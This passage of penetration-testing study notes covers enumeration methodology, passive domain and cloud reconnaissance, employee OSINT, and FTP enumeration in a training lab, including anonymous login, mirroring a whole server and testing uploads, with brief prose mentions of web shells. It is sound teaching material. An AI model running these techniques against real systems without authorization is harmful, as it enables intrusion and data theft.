- [Section 7: NFS — (All Versions, Mount Steps, Dangerous Settings)](#section-7-nfs-network-file-system)
- [Section 8: DNS — (All Record Types, BIND9, AXFR Zone Transfer, DNSenum)](#section-8-dns-domain-name-system)
- [Section 9: SMTP — (All Commands, Open Relay, Nmap Scripts)](#section-9-smtp-simple-mail-transfer-protocol)
- [Section 10: IMAP / POP3 — (All Commands, cURL, OpenSSL)](#section-10-imap--pop3)
- [Section 11: SNMP — (MIB/OID, SNMPwalk, OneSixtyOne, Braa)](#section-11-snmp-simple-network-management-protocol)
- [Section 12: MySQL — (All SQL Commands, Nmap Scripts)](#section-12-mysql)
- [Section 13: MSSQL — (mssqlclient.py, Metasploit, Nmap Scripts)](#section-13-mssql-microsoft-sql-server)
- [Section 14: Oracle TNS — (ODAT, SQLplus, File Upload via UTL_FILE)](#section-14-oracle-tns)
- [Section 15: IPMI — (RAKP Vulnerability, Hashcat Cracking)](#section-15-ipmi-intelligent-platform-management-interface)
- [Section 16: Linux Remote Management — (SSH, Rsync, R-Services)](#section-16-linux-remote-management-protocols)
- [Section 17: Windows Remote Management — (RDP, WinRM, WMI)](#section-17-windows-remote-management-protocols)

---

## Section 1: Enumeration Methodology

### What is Enumeration Methodology?

Enumeration methodology is a standardized, step-by-step approach used during penetration testing to gather information about a target system in an organized way. Without a proper methodology, a penetration tester might miss important parts of the target or waste time going in the wrong direction. Because penetration testing involves many different types of systems, networks, and configurations, having a fixed but flexible structure helps the tester stay on track. The methodology is not a rigid checklist but rather a systematic framework that allows for changes depending on what the tester finds. It is divided into three levels: Infrastructure-based enumeration, Host-based enumeration, and OS-based enumeration. These three levels together cover everything from the internet presence of a company to the internal operating system configuration of its servers.

---

### The 6 Layers of Enumeration

The entire enumeration process is organized into 6 layers, each representing a boundary or "wall" that the tester tries to pass through to get closer to the target. Think of it like a labyrinth where each layer is a ring, and the tester needs to find the gap in each ring to move forward. Each layer has specific goals and information categories that the tester focuses on.

---

#### Layer 1 — Internet Presence

This is the outermost layer. Here the tester finds out what the company looks like from the internet. The goal is to find all possible targets such as domains, subdomains, IP addresses, cloud instances, and other infrastructure that is visible on the internet. This layer is especially important in black-box tests where no information is given upfront. The tester uses passive techniques — meaning they do not directly connect to the target — to gather information. Tools like crt.sh, Shodan, and DNS lookups are used at this stage. Information gathered includes domains, subdomains, virtual hosts (vHosts), ASN (Autonomous System Numbers), netblocks, IP addresses, cloud instances, and security measures in place.

---

#### Layer 2 — Gateway

Once the internet presence is identified, the next step is to understand how the company protects its infrastructure. This layer focuses on identifying the protective measures between the internet and the internal network. The goal is to understand what kind of security is in place, such as firewalls, DMZ (Demilitarized Zones), IPS/IDS systems, EDR tools, proxies, NAC (Network Access Control), VPNs, and services like Cloudflare. Understanding the gateway helps the tester know what kind of traffic is blocked and what might pass through without triggering alarms.

---

#### Layer 3 — Accessible Services

This is the layer that is mostly covered in the main footprinting module. Here the tester identifies all services running on the target systems that can be accessed from outside. Each service has a specific purpose — for example, FTP for file transfer, SSH for remote access, HTTP for web traffic. The tester looks at the service type, its version, its configuration, which port it is running on, and what functionality it provides. The goal is to understand how the service works and how it can be communicated with, which leads to finding ways to exploit it.

---

#### Layer 4 — Processes

Every time a command or function is executed on a server, some process runs behind the scenes. This layer focuses on identifying what internal processes are running, what data they handle, and what sources and destinations are involved. For example, a web server process might be processing requests from users and sending them to a database. Understanding these processes helps the tester identify dependencies and potential weak points. Key information includes PID (Process ID), the type of data being processed, tasks being performed, and source/destination details.

---

#### Layer 5 — Privileges

Every service on a system runs under a specific user account with specific permissions. Sometimes administrators give services more permissions than needed, or they forget to review permission settings. This layer is about identifying what permissions are attached to each service and each user, and whether those permissions can be misused. This is especially important in Active Directory environments where users might have permissions across many systems. The tester looks at groups, users, permissions, restrictions, and the overall environment.

---

#### Layer 6 — OS Setup

This is the innermost layer. At this point, the tester already has internal access to the system and is gathering information about the operating system itself. This includes the OS type (Linux, Windows), the patch level (is it up to date?), network configuration, environment variables, configuration files, and sensitive private files. The goal is to understand how the administrator has set up and maintains the system, and to find any sensitive internal information that can be used for further exploitation.

---

## Section 2: Domain Information

### What is Domain Information?

Domain information is one of the most important parts of the passive reconnaissance phase in penetration testing. It is not only about finding subdomains but about understanding the full internet presence of a company — what technologies they use, what services they run, and how their infrastructure is structured. This entire process is done passively, meaning the tester acts like a normal internet user or customer and does not send any direct scans or requests to the target that could alert the company. The information gathered here gives a big-picture view of the target before any active testing begins. Think of it as reading everything that is publicly available about the company without knocking on their door.

---

### Checking the Company Website

The first step is always to visit the company''s official website and read the content carefully. The website tells you what kind of services the company offers, what technologies they use, and what their business model is. For example, if a company offers IoT solutions, app development, and cloud hosting, then you know they likely run servers, APIs, and possibly cloud storage. Reading the website with a developer''s eye helps you guess what kind of backend infrastructure might be in place. Even small details like "built with Django" or "powered by AWS" in a footer or page source code reveal important technical information.

---

### SSL Certificates and crt.sh

#### What is crt.sh?

crt.sh is a website that stores Certificate Transparency logs. When any website gets an SSL certificate from a Certificate Authority like Let''s Encrypt, a public log entry is created. This log can be searched to find all subdomains that a company has ever used a certificate for. This is extremely useful because companies often have many subdomains — some of which might be forgotten or misconfigured. By searching crt.sh for a domain, you can find subdomains that are not listed anywhere else publicly.

#### How to Use crt.sh via Command Line

```bash
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .
```

**Purpose:** This command fetches JSON data from crt.sh about all SSL certificates issued for the domain `inlanefreight.com`. The `jq .` part formats the JSON output to make it readable.

To filter only unique subdomains:

```bash
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d''"'' -f2 | awk ''{gsub(/\\n/,"\n");}1;'' | sort -u
```

This command filters out only the subdomain names from the JSON response, removes certificate subject names (CN=), and sorts the results to show only unique entries. The output gives you a clean list of all discovered subdomains.

---

### Finding Company-Hosted Servers

#### Purpose

After getting a list of subdomains, the next step is to find which ones point to IP addresses that belong to the company itself (not third-party providers). This is important because you can only test hosts that are within the scope of your engagement. Third-party hosted services (like AWS, Cloudflare) require separate permission.

#### Command

```bash
for i in $(cat subdomainlist); do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4; done
```

This loop goes through each subdomain in your list, uses the `host` command to resolve its IP address, and then filters only those that belong to the target domain. The output shows the subdomain and its resolved IP address.

---

### Using Shodan for IP Intelligence

#### What is Shodan?

Shodan is a search engine for internet-connected devices. Unlike Google which indexes web content, Shodan indexes open ports, service banners, and device information. It can show what services are running on a given IP address, what software versions are in use, and what ports are open.

#### Command

```bash
for i in $(cat ip-addresses.txt); do shodan host $i; done
```

This loops through all discovered IP addresses and queries Shodan for information about each one. The output might show open ports like 22 (SSH), 80 (HTTP), 443 (HTTPS), along with the software running on them (like nginx, Apache), SSL certificate details, and even the city and organization the IP belongs to.

---

### DNS Records with dig

#### What is dig?

`dig` (Domain Information Groper) is a command-line tool used to query DNS servers and retrieve DNS records. DNS records are like a phonebook for the internet — they map domain names to IP addresses and other information.

#### Command

```bash
dig any inlanefreight.com
```

This retrieves all available DNS record types for the domain. The main record types and what they tell you:

- **A Records** — Map a domain name to an IPv4 address. Shows you which servers the domain points to.
- **MX Records** — Mail exchange records. Tell you which servers handle email for the domain.
- **NS Records** — Name server records. Show which DNS servers are responsible for the domain.
- **TXT Records** — Text records used for verification and security purposes. These can contain verification codes for services like Google, Atlassian, and LogMeIn. They also contain SPF (Sender Policy Framework) records which reveal what email services and IP addresses the company uses.
- **SOA Record** — Start of Authority. Contains administrative information about the domain including the primary DNS server and the contact email for the domain.

#### What TXT Records Reveal

From TXT records, a tester can identify third-party tools and services the company uses. For example:

| TXT Record Value | What It Reveals |
|---|---|
| `atlassian-domain-verification` | Company uses Atlassian (Jira, Confluence, Bitbucket) |
| `google-site-verification` | Company uses Google services; might have open Google Drive links |
| `logmein-verification-code` | Company uses LogMeIn for remote access management |
| `v=spf1 include:mailgun.org` | Company uses Mailgun for email APIs |
| `include:spf.protection.outlook.com` | Company uses Microsoft 365/Azure |

Each of these reveals attack surfaces — for example, Mailgun APIs might be vulnerable to IDOR or SSRF attacks, and Azure file storage can be accessed via SMB protocol.

---

## Section 3: Cloud Resources

### What are Cloud Resources in Penetration Testing?

Modern companies use cloud services from AWS, Google Cloud (GCP), and Microsoft Azure for storage, computing, and hosting. While cloud providers themselves are very secure, the configurations that companies apply can introduce vulnerabilities. The most common issue is misconfigured storage — such as AWS S3 buckets, Azure Blobs, or GCP Cloud Storage — that are set to public access without authentication. During a penetration test, discovering these misconfigured cloud resources can lead to accessing sensitive files like documents, source code, private keys, and even credentials.

---

### Finding Cloud Storage with Google Dorks

#### What are Google Dorks?

Google Dorks are advanced Google search operators that narrow down search results to very specific types of pages. In the context of cloud resources, they help find public files stored in AWS or Azure that are indexed by Google.

For AWS S3 Buckets:
```
intext:companyname inurl:amazonaws.com
```

For Azure Blobs:
```
intext:companyname inurl:blob.core.windows.net
```

These searches can return PDF files, documents, images, and other files that companies have accidentally made public in their cloud storage. Sometimes these files contain sensitive business data.

---

### Finding Cloud Resources in Website Source Code

Companies often load images, JavaScript files, and CSS from their cloud storage to reduce load on web servers. If you inspect the HTML source code of a company''s website, you might find links to `blob.core.windows.net` or `s3.amazonaws.com` which reveal the cloud storage URLs. These can then be further investigated to see if they allow public access or directory listing.

---

### Third-Party Tools for Cloud Enumeration

#### Domain.Glass

Domain.Glass is an online tool that provides information about a domain''s infrastructure. It can reveal cloud service providers, CDN usage (like Cloudflare), and basic security assessment information. If Cloudflare is detected, it is noted as a security measure in Layer 2 (Gateway) of the enumeration methodology.

#### GrayHatWarfare

GrayHatWarfare is a specialized search engine for public cloud storage. It indexes publicly accessible files in AWS S3, Azure Blob, and GCP Cloud Storage. A tester can search by company name, filter by file type (PDF, DOCX, XLSX, etc.), and discover what data has been accidentally made public. This is a completely passive approach and requires no interaction with the target''s own systems.

---

### Risk: Leaked SSH Private Keys

One of the most dangerous things that can appear in misconfigured cloud storage is leaked SSH private keys. An SSH private key (typically a file named `id_rsa`) allows direct login to servers without needing a password. If an employee accidentally uploaded their private key to a public S3 bucket, an attacker can download it and use it to log into any server that has the corresponding public key installed. This is a very real risk that happens when employees are under pressure, make mistakes, or do not understand the consequences of sharing certain files.

---

## Section 4: Staff — OSINT on Employees

### Why Look at Employees?

Employees of a company are a goldmine of information for penetration testers doing OSINT (Open Source Intelligence). By looking at LinkedIn profiles, GitHub accounts, job postings, and professional websites, you can learn what technologies and tools the company uses, what the internal team structure looks like, what programming languages and frameworks developers work with, and even find leaked credentials or sensitive code in public repositories. This information helps you understand the attack surface and plan your approach.

---

### LinkedIn Job Posts

Job posts reveal a lot about internal technology stacks. For example, if a job requires experience with Django, Flask, PostgreSQL, and Kubernetes, you know the company runs Python web applications on a container infrastructure with a PostgreSQL database. This tells you what technologies to look for vulnerabilities in. A job requiring Atlassian Suite experience confirms the earlier TXT record finding that Atlassian tools are used internally.

---

### LinkedIn Employee Profiles

Individual employee profiles show their skills, past projects, and linked GitHub accounts. From a developer''s GitHub profile, you might find open source code they wrote that contains company-specific logic, hardcoded API keys or JWT tokens, database connection strings, or even personal email addresses tied to company systems.

---

### Risk: Hardcoded Credentials in Public Code

A very common finding is that developers push code to GitHub that contains hardcoded secrets. For example, a JWT (JSON Web Token) with a hardcoded secret key found in a public GitHub repo could allow an attacker to forge authentication tokens for the company''s web application. This is why code review and secrets scanning are so important in security-conscious organizations.

---

## Section 5: FTP (File Transfer Protocol)

### What is FTP?

FTP (File Transfer Protocol) is one of the oldest protocols on the internet. It was created long before modern security concerns and has been in use for decades for transferring files between computers. FTP operates at the application layer of the TCP/IP protocol stack, sitting at the same layer as HTTP and POP3. This means it works on top of the basic internet communication rules and provides a specific service — file transfer. There are special FTP programs and clients built specifically for FTP, in addition to built-in support in many operating systems. FTP is widely used by web developers, system administrators, and businesses to upload files to servers, share data, and move large files between systems over a network.

---

### How FTP Works — Two Channels

FTP is unique because it uses two separate TCP connections to function, not just one like most protocols.

**Channel 1 — Control Channel (TCP Port 21):**
This is where all the commands and responses happen. When you connect to an FTP server, this channel is opened first. The client sends commands like `LIST`, `GET`, `PUT`, and the server responds with status codes. This channel stays open for the entire FTP session.

**Channel 2 — Data Channel (TCP Port 20):**
This is where the actual file data flows. Every time you list a directory or transfer a file, a separate data connection is opened for that specific operation and then closed afterward. This separation of control and data is a key design feature of FTP.

If a connection is interrupted during a file transfer, FTP can resume the transfer after reconnecting — this is another important feature that makes FTP practical for large file transfers.

---

### Active Mode vs Passive Mode

#### Active Mode

In Active Mode, the client connects to the server on port 21 (control channel) and tells the server which port the client is using for data. The server then initiates the data connection back to the client on port 20. The problem here is that if the client is behind a firewall, the firewall may block incoming connections from the server, breaking the data transfer.

#### Passive Mode

In Passive Mode, after the client connects on port 21, the server announces an available port number. The client then initiates the data connection to that port on the server. Because the client is always the one starting connections, firewalls protecting the client do not block anything. This is why passive mode is the standard for internet FTP connections today.

---

### FTP Authentication

FTP normally requires a username and password to log in. However, many servers are configured to allow **anonymous FTP** where anyone can log in using "anonymous" as the username (and sometimes any email address as a password). Anonymous FTP is used to share public files but carries security risks because anyone can access those files.

> **Important security concern:** FTP sends all data including usernames and passwords in **plain text** (unencrypted). If someone is monitoring the network, they can see everything. This is why SFTP (SSH File Transfer Protocol) and FTPS (FTP over SSL) were developed as secure alternatives.

---

### TFTP (Trivial File Transfer Protocol)

#### What is TFTP?

TFTP is a much simpler version of FTP. It was designed for situations where simplicity is more important than features or security. While FTP uses TCP and provides reliable, ordered delivery, TFTP uses **UDP**, making it faster but unreliable. TFTP handles data loss through application-layer recovery, meaning it has its own simple mechanism for dealing with lost packets.

TFTP has **no authentication at all** — no usernames, no passwords. It relies entirely on the file system''s read and write permissions to control access. Because of this total lack of security, TFTP should only be used on local, protected, trusted networks — never on the internet. It is commonly used for booting network devices, loading firmware, and distributing configuration files in controlled environments.

#### TFTP Commands

| Command | Description |
|---|---|
| `connect` | Sets the remote host and optionally the port number for file transfers. You must run this before any transfer commands. Example: `connect 10.129.14.136` |
| `get` | Transfers one or more files FROM the remote host TO your local machine. Example: `get config.txt` |
| `put` | Transfers one or more files FROM your local machine TO the remote host. Example: `put update.bin` |
| `quit` | Exits the TFTP program and closes the connection cleanly. |
| `status` | Shows the current status of the TFTP session, including the transfer mode (ASCII or binary), whether a connection is active, the timeout value, and other session details. |
| `verbose` | Turns verbose mode on or off. When verbose is on, extra information is displayed during file transfers including packet counts and timing — useful for debugging. |

> **Important note:** Unlike FTP, TFTP does NOT have a directory listing command. You cannot see what files exist on the server — you must already know the exact filename you want to download.

---

### vsFTPd — Default FTP Server on Linux

#### What is vsFTPd?

vsFTPd (Very Secure FTP Daemon) is the most commonly used FTP server software on Linux-based systems. The name "Very Secure" refers to its design philosophy of security-first. It is the default FTP server on many Linux distributions including Ubuntu and CentOS. Understanding vsFTPd is important because it is what you will encounter most often during penetration tests on Linux systems.

#### Installing vsFTPd

```bash
sudo apt install vsftpd
```

**Purpose:** Installs the vsFTPd FTP server package on your Linux system. The `sudo` is needed because installing software requires administrator privileges. After installation, the service starts automatically and the configuration file is created at `/etc/vsftpd.conf`.

#### Viewing the vsFTPd Configuration File

```bash
cat /etc/vsftpd.conf | grep -v "#"
```

**Purpose:** Displays the vsFTPd configuration file, filtering out all comment lines (lines starting with `#`) so you only see the active settings. The `grep -v "#"` part means "show everything EXCEPT lines containing `#`". This gives you a clean view of what settings are actually active.

Key configuration settings and what they mean:

| Setting | Description |
|---|---|
| `listen=NO` | Controls whether vsFTPd runs as a standalone service (YES) or is managed by the inetd/xinetd super-server (NO). Standalone is more common in modern setups. |
| `listen_ipv6=YES` | Enables IPv6 listening in addition to IPv4. This allows clients with IPv6 addresses to connect. |
| `anonymous_enable=NO` | Controls whether anonymous login is allowed. When set to NO, only authenticated users with valid credentials can log in. Setting this to YES is a dangerous configuration that allows anyone to connect. |
| `local_enable=YES` | Allows local Linux system users (users with accounts on the server) to log in to FTP with their system credentials. |
| `dirmessage_enable=YES` | When a user enters a directory that has a `.message` file, the contents of that file are displayed. |
| `use_localtime=YES` | Uses the server''s local timezone when displaying file timestamps in directory listings instead of UTC. |
| `xferlog_enable=YES` | Enables logging of all file uploads and downloads. This creates an audit trail of all file transfer activity. Important for security monitoring. |
| `connect_from_port_20=YES` | In Active Mode, the server initiates data connections from port 20. This setting enforces that behavior. |
| `secure_chroot_dir=/var/run/vsftpd/empty` | Points to an empty directory used for security purposes when the server needs to operate in a chrooted (isolated) environment without filesystem access. |
| `pam_service_name=vsftpd` | Specifies the PAM (Pluggable Authentication Module) service configuration file that vsFTPd will use for authentication. PAM is the Linux authentication framework. |
| `rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem` | The path to the SSL certificate file used when SSL encryption is enabled. |
| `rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key` | The path to the private key that pairs with the SSL certificate. |
| `ssl_enable=NO` | Controls whether SSL/TLS encryption is used for FTP connections. When NO, all data including passwords travels in plain text. |

---

### The /etc/ftpusers File

#### What is /etc/ftpusers?

This file is a **deny list** — it contains usernames of system users who are specifically prohibited from using FTP, even if they have valid system accounts and correct passwords. This is a security feature to prevent certain powerful or sensitive system accounts from accessing the FTP service.

```bash
cat /etc/ftpusers
```

Example output:
```
guest
john
kevin
```

This means even if "guest", "john", and "kevin" exist on the Linux system and know their passwords, they cannot log in through FTP. This is typically used to block system accounts (like root, daemon, nobody) from FTP access as a security measure.

---

### Dangerous FTP Settings

These settings, when enabled, create security vulnerabilities that penetration testers specifically look for:

| Setting | Risk |
|---|---|
| `anonymous_enable=YES` | Allows anyone to log in without any credentials at all. Just use "anonymous" as the username. This is the most common dangerous setting and is often left enabled by accident. |
| `anon_upload_enable=YES` | Allows anonymous users to upload files. This is extremely dangerous because attackers can upload malicious files, web shells, or use the FTP space for illegal content. |
| `anon_mkdir_write_enable=YES` | Allows anonymous users to create new directories. Combined with upload, an attacker can organize uploaded malicious content in their own folder structure. |
| `no_anon_password=YES` | Anonymous users are not even asked to enter a password. Normally anonymous FTP asks for an email address as a courtesy password. This setting skips even that minimal step. |
| `anon_root=/home/username/ftp` | Specifies the root directory for anonymous users. Restricts anonymous users to a specific folder so they cannot browse the entire filesystem. |
| `write_enable=YES` | Enables the FTP write commands: STOR (upload), DELE (delete), RNFR/RNTO (rename), MKD (make directory), RMD (remove directory), APPE (append to file), and SITE (site-specific commands). Without this, users can only read and download. |
| `hide_ids=YES` | Replaces the actual numeric user IDs and group IDs in directory listings with the generic string "ftp". Prevents attackers from learning real usernames on the system through FTP directory listings. |
| `ls_recurse_enable=YES` | Allows the use of recursive directory listing (ls -R). Lets users see the entire directory tree at once with a single command. For a penetration tester, this is extremely useful because one command reveals the entire FTP file structure. |

---

### Connecting to FTP — Anonymous Login

#### How to Perform Anonymous Login

```bash
ftp 10.129.14.136
```

What happens step by step:

1. The FTP client attempts to connect to the server at the given IP on port 21.
2. The server responds with a `220` banner — this is the welcome message that often includes the FTP software name and version.
3. You are prompted for a username. Type `anonymous` and press Enter.
4. You may be prompted for a password. For anonymous login, type anything or just press Enter.
5. If anonymous login is allowed, you receive code `230` meaning "Login successful."
6. The server tells you the remote system type (usually UNIX) and transfer mode (binary or ASCII).

Full example interaction:

```
ftp 10.129.14.136

Connected to 10.129.14.136.
220 "Welcome to the HTB Academy vsFTP service."
Name (10.129.14.136:cry0l1t3): anonymous

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

> **Important note:** The banner (code 220) often reveals the FTP software name and version. This is very valuable information for a penetration tester because it tells you exactly what software is running, allowing you to search for known vulnerabilities in that specific version.

---

### FTP Commands Inside a Session

#### ls — List Directory Contents

```
ftp> ls
```

**Purpose:** Lists all files and directories in the current directory on the FTP server. Shows file permissions, owner IDs, file sizes, dates, and names. The status codes shown are `200` (PORT command success), `150` (about to send data), and `226` (transfer complete).

Example output:

```
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
226 Directory send OK.
```

The first column shows file permissions (`d` means directory, `-` means file, then `rwx` for read/write/execute for owner/group/others). Second and third columns show owner UID and GID. Fourth is file size. Then date and filename.

---

#### status — Check Current FTP Session Settings

```
ftp> status
```

**Purpose:** Displays the current configuration of your FTP session. This is not about the server — it is about how your FTP client is currently set up. It tells you what mode you are in, what your transfer settings are, and what optional features are enabled or disabled.

Example output:

```
Connected to 10.129.14.136.
No proxy connection.
Connecting using address family: any.
Mode: stream; Type: binary; Form: non-print; Structure: file
Verbose: on; Bell: off; Prompting: on; Globbing: on
Store unique: off; Receive unique: off
Case: off; CR stripping: on
Quote control characters: on
Ntrans: off
Nmap: off
Hash mark printing: off; Use of PORT cmds: on
Tick counter printing: off
```

---

#### debug — Enable Debug Mode

```
ftp> debug
```

**Purpose:** Turns on debugging in the FTP client. When debug mode is on, the client prints every command it sends to the server before sending it. This lets you see the raw FTP protocol communication happening behind the scenes. It is very useful for understanding exactly how FTP works and for troubleshooting connection issues.

After enabling:
```
Debugging on (debug=1).
```

Now every command you type will show the raw FTP protocol command being sent, like `---> PORT 10,10,14,4,188,195`.

---

#### trace — Enable Packet Tracing

```
ftp> trace
```

**Purpose:** Turns on packet-level tracing. This is even more detailed than debug mode. With trace enabled, the FTP client shows every network packet being sent and received. This is mainly used for deep protocol analysis and troubleshooting at the network level.

After enabling:
```
Packet tracing on.
```

#### Using debug and trace together — Detailed Output Example

```
ftp> debug
Debugging on (debug=1).

ftp> trace
Packet tracing on.

ftp> ls
---> PORT 10,10,14,4,188,195
200 PORT command successful. Consider using PASV.
---> LIST
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
226 Directory send OK.
```

Now you can see the raw PORT command being sent (which tells the server where to send the data) and the LIST command that requests the directory listing. This is exactly how the FTP protocol works under the hood.

---

#### ls -R — Recursive Directory Listing

```
ftp> ls -R
```

**Purpose:** Lists all files and directories recursively — meaning it goes into every subfolder and lists everything inside them too, all in one command. This requires `ls_recurse_enable=YES` to be set on the server. For a penetration tester, this is a very powerful command because you can see the ENTIRE file structure of the FTP server with one command without having to manually navigate each directory.

Example output:

```
.:
-rw-rw-r--    1 ftp      ftp      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Employees

./Clients:
drwx------    2 ftp      ftp          4096 Sep 16 18:04 HackTheBox
drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:00 Inlanefreight

./Clients/HackTheBox:
-rw-r--r--    1 ftp      ftp         34872 Sep 16 18:04 appointments.xlsx
-rw-r--r--    1 ftp      ftp        498123 Sep 16 18:04 contract.docx
-rw-r--r--    1 ftp      ftp        478237 Sep 16 18:04 contract.pdf
-rw-r--r--    1 ftp      ftp           348 Sep 16 18:04 meetings.txt

./Clients/Inlanefreight:
-rw-r--r--    1 ftp      ftp         14211 Sep 16 18:00 appointments.xlsx
-rw-r--r--    1 ftp      ftp         37882 Sep 16 17:58 contract.docx
-rw-r--r--    1 ftp      ftp            89 Sep 16 17:58 meetings.txt
-rw-r--r--    1 ftp      ftp        483293 Sep 16 17:59 proposal.pptx

./Documents:
-rw-r--r--    1 ftp      ftp         23211 Sep 16 18:05 appointments-template.xlsx
-rw-r--r--    1 ftp      ftp         32521 Sep 16 18:05 contract-template.docx
-rw-r--r--    1 ftp      ftp        453312 Sep 16 18:05 contract-template.pdf

./Employees:
226 Directory send OK.
```

> Notice that when `hide_ids=YES` is set, all owner IDs show as "ftp" instead of real usernames. Also notice that the `./Employees` directory is empty — there are no files inside it.

---

#### get — Download a Single File

```
ftp> get "Important Notes.txt"
```

**Purpose:** Downloads a specific file from the FTP server to your local machine. The file is saved in whatever directory you were in on your local machine when you launched FTP. If the filename has spaces, put it in quotes. When the download completes, FTP shows how many bytes were received and the transfer speed.

Full example:

```
ftp> ls

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxrwx    1 ftp      ftp             0 Sep 16 17:24 Calendar.pptx
drwxrwxrwx    4 ftp      ftp          4096 Sep 16 17:57 Clients
drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:05 Documents
drwxrwxrwx    2 ftp      ftp          4096 Sep 16 17:24 Employees
-rwxrwxrwx    1 ftp      ftp            41 Sep 18 15:58 Important Notes.txt
226 Directory send OK.


ftp> get Important\ Notes.txt

local: Important Notes.txt remote: Important Notes.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Important Notes.txt (41 bytes).
226 Transfer complete.
41 bytes received in 0.00 secs (606.6525 kB/s)


ftp> exit

221 Goodbye.
```

After exiting FTP, verify the file was downloaded:

```bash
ls | grep Notes.txt
''Important Notes.txt''
```

Note the backslash `\` before the space in the filename when not using quotes — this "escapes" the space so the shell doesn''t treat it as two separate arguments.

---

### Downloading All Files at Once with wget

```bash
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```

**Purpose:** This downloads the entire FTP server content in one command using wget instead of the interactive FTP client. This is very useful when the FTP server has many files spread across many directories and you want everything at once.

Breaking down the command:

- `wget` — The download tool
- `-m` — Mirror mode, recursively downloads everything, preserving directory structure
- `--no-passive` — Forces Active Mode (uses PORT commands instead of PASV)
- `ftp://anonymous:anonymous@10.129.14.136` — The URL format: protocol://username:password@server

What happens: wget connects to the FTP server, logs in as anonymous, and recursively downloads every file it can access. A directory named after the server''s IP address is created, and all files are stored inside it preserving the original folder structure.

Example output:

```
--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/
           => ''10.129.14.136/.listing''
Connecting to 10.129.14.136:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PORT ... done.    ==> LIST ... done.

FINISHED --2021-09-19 14:45:58--
Total wall clock time: 0,03s
Downloaded: 15 files, 1,7K in 0,001s (3,02 MB/s)
```

> **Security warning:** Downloading ALL files at once may trigger alerts on the target system because no legitimate user normally downloads everything simultaneously. Use this technique carefully during authorized penetration tests.

---

### Viewing Downloaded Structure with tree

```bash
tree .
```

**Purpose:** Displays all downloaded files in a visual tree format. This makes it easy to understand the directory structure at a glance.

Example output:

```
.
└── 10.129.14.136
    ├── Calendar.pptx
    ├── Clients
    │   └── Inlanefreight
    │       ├── appointments.xlsx
    │       ├── contract.docx
    │       ├── meetings.txt
    │       └── proposal.pptx
    ├── Documents
    │   ├── appointments-template.xlsx
    │   ├── contract-template.docx
    │   └── contract-template.pdf
    ├── Employees
    └── Important Notes.txt

5 directories, 9 files
```

---

### put — Upload a File to FTP Server

#### Why Uploading Matters in Penetration Testing

If you can upload files to an FTP server that is connected to a web server, you can potentially upload a web shell — a script that lets you run system commands through the browser. This is a common path to gaining Remote Command Execution (RCE). Even FTP logs can be abused — if a web server logs FTP activity and you can inject commands into your FTP username or input, those commands might execute when the log file is processed.

#### Step 1 — Create a Test File

```bash
touch testupload.txt
```

**Purpose:** Creates an empty test file named `testupload.txt` on your local machine. The `touch` command creates a new empty file if it does not exist, or updates the timestamp if it does. This is used as a safe, harmless test to check whether the FTP server allows uploads.

#### Step 2 — Upload the File

```
ftp> put testupload.txt
```

**Purpose:** Uploads the `testupload.txt` file from your local machine to the current directory on the FTP server. The FTP client sends the `STOR` command to the server, the server opens a data channel, and the file bytes are transferred.

Full example:

```
ftp> put testupload.txt

local: testupload.txt remote: testupload.txt
---> PORT 10,10,14,4,184,33
200 PORT command successful. Consider using PASV.
---> STOR testupload.txt
150 Ok to send data.
226 Transfer complete.
```

After the upload, verify it appears in the directory listing:

```
ftp> ls

---> LIST
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
-rw-------    1 1002     133             0 Sep 15 14:57 testupload.txt
226 Directory send OK.
```

The `testupload.txt` now appears in the listing with size 0 (empty file). This confirms upload is possible — a major finding in a penetration test.

---

### hide_ids Setting — Impact on Directory Listing

#### What hide_ids=YES Does

When this setting is active, the FTP server replaces all real user and group ownership information in directory listings with the generic string "ftp". Normally, directory listings show the actual UID and GID numbers of file owners. With `hide_ids` enabled, all files appear to be owned by "ftp".

**Why administrators use it:** To prevent attackers from learning real system usernames through FTP directory listings, because those usernames could then be used in brute force attacks against SSH, FTP, or other services.

Example listing WITH `hide_ids=YES`:

```
-rw-rw-r--    1 ftp     ftp      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 ftp     ftp         4096 Sep 14 17:03 Clients
-rw-rw-r--    1 ftp     ftp           41 Sep 14 16:45 Important Notes.txt
-rw-------    1 ftp     ftp            0 Sep 15 14:57 testupload.txt
```

